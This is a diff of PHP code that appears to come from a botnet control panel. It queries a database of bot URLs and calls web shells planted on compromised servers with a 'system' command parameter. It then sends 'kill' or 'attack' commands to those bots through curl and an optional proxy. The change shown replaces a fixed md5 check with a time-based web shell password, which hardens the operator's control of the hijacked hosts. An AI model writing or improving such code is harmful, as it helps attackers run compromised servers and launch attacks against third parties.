@@ -735,7 +735,7 @@ $x = 0;
 while($row = mysqli_fetch_assoc($rows)) {
 
 $source = conn($row['url'].'?_=system&__=uname');
-if(strpos($source, md5(666))) {
+if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $x++;
 $ch = curl_init();
 if(USE_PROXY == 1) {
@@ -769,7 +769,7 @@ echo '<br /><p>Killed all actions for <b>'.$x.'</b> bots.</p>';
             while($row = mysqli_fetch_assoc($rows)) {
 
 $source = conn($row['url'].'?_=system&__=uname');
-if(strpos($source, md5(666))) {
+if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $y++;
 $ch = curl_init();
 if(USE_PROXY == 1) {
@@ -844,7 +844,7 @@ if($row !== false) {
 if($_POST['sup'] == 'kill') {
 
 $source = conn($row['url'].'?_=system&__=uname');
-if(strpos($source, md5(666))) {
+if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $ch = curl_init();
 if(USE_PROXY == 1) {
 $curlConfig = array(
@@ -878,7 +878,7 @@ echo '<br /><p>Killed all actions for id <b>'.$_POST['botid1'].'</b>.</p>';
         } elseif($_POST['sup'] == 'attack') {
 
 $source = conn($row['url'].'?_=system&__=uname');
-if(strpos($source, md5(666))) {
+if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $ch = curl_init();
 if(USE_PROXY == 1) {
 $curlConfig = array(
